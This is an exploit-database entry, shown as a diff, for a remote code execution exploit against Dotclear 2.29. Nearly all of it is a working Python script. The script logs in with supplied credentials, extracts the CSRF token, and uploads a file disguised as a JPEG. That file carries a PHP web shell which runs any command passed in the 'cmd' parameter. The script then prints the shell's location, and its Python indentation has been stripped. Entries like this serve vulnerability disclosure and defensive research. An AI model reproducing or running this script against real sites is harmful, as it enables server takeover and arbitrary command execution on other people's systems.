@@ -1,0 +1,103 @@
+id: 39642
+date: 06/04/2024
+title: Dotclear 2.29 - Remote Code Execution Exploit
+author: Ahmet Ümit BAYRAM
+cves: 
+
+# Exploit Title: Dotclear 2.29 - Remote Code Execution (RCE)
+# Discovered by: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://git.dotclear.org/explore/repos
+# Software Link:
+https://github.com/dotclear/dotclear/archive/refs/heads/master.zip
+# Tested Version: v2.29 (latest)
+# Tested on: MacOS
+
+import requests
+import time
+import random
+import string
+from bs4 import BeautifulSoup
+
+def generate_filename(extension=".inc"):
+return ''.join(random.choices(string.ascii_letters + string.digits, k=5)) +
+extension
+
+def get_csrf_token(response_text):
+soup = BeautifulSoup(response_text, 'html.parser')
+token = soup.find('input', {'name': 'xd_check'})
+return token['value'] if token else None
+
+def login(base_url, username, password):
+print("Exploiting...")
+time.sleep(1)
+print("Logging in...")
+time.sleep(1)
+session = requests.Session()
+login_data = {
+"user_id": username,
+"user_pwd": password
+}
+login_url = f"{base_url}/admin/index.php?process=Auth"
+login_response = session.post(login_url, data=login_data)
+if "Logout" in login_response.text:
+print("Login Successful!")
+return session
+else:
+print("Login Failed!")
+return None
+
+def upload_file(session, base_url, filename):
+print("Shell Preparing...")
+time.sleep(1)
+boundary = "---------------------------376201441124932790524235275389"
+headers = {
+"Content-Type": f"multipart/form-data; boundary={boundary}",
+"X-Requested-With": "XMLHttpRequest"
+}
+csrf_token = get_csrf_token(session.get(f"{base_url}
+/admin/index.php?process=Media").text)
+payload = (
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n"
+f"2097152\r\n"
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"xd_check\"\r\n\r\n"
+f"{csrf_token}\r\n"
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"upfile[]\"; filename=\"{filename}
+\"\r\n"
+f"Content-Type: image/jpeg\r\n\r\n"
+"<html>\n<body>\n<form method=\"GET\" name=\"<?php echo
+basename($_SERVER['PHP_SELF']); ?>\">\n"
+"<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input
+type=\"SUBMIT\" value=\"Execute\">\n"
+"</form>\n<pre>\n<?php\nif(isset($_GET['cmd']))\n{\nsystem($_GET['cmd']);\n}
+\n?>\n</pre>\n</body>\n</html>\r\n"
+f"--{boundary}--\r\n"
+)
+upload_response = session.post(f"{base_url}
+/admin/index.php?process=Media&sortby=name&order=asc&nb=30&page=1&q=&file_mode=grid&file_type=&plugin_id=&popup=0&select=0",
+headers=headers, data=payload.encode('utf-8'))
+
+if upload_response.status_code == 200:
+print(f"Your Shell is Ready: {base_url}/public/{filename}")
+else:
+print("Exploit Failed!")
+
+def main(base_url, username, password):
+filename = generate_filename()
+session = login(base_url, username, password)
+if session:
+upload_file(session, base_url, filename)
+
+if __name__ == "__main__":
+import sys
+if len(sys.argv) != 4:
+print("Usage: python script.py <siteurl> <username> <password>")
+else:
+base_url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+main(base_url, username, password)
+
+#  0day.today [2024-06-15]  #
